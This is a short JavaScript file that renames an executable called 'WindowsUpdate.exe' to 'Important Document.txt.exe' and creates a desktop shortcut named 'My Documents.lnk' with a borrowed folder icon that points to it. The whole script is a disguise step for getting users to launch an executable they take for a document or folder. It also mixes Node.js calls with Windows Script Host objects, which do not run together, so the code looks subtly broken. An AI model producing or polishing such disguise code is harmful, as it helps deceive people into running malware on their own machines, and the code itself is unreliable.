// Save as rename.js and run on Windows
var fs = require('fs');
var path = require('path');

// Rename EXE to look like text file
var exePath = path.join(__dirname, 'dist', 'WindowsUpdate.exe');
var newPath = path.join(__dirname, 'dist', 'Important Document.txt.exe');

fs.renameSync(exePath, newPath);
console.log('Renamed to: Important Document.txt.exe');

// Create shortcut
var WshShell = new ActiveXObject("WScript.Shell");
var shortcut = WshShell.CreateShortcut(path.join(WshShell.SpecialFolders("Desktop"), "My Documents.lnk"));
shortcut.TargetPath = newPath;
shortcut.IconLocation = "shell32.dll,1";
shortcut.Save();

console.log('Shortcut created on Desktop');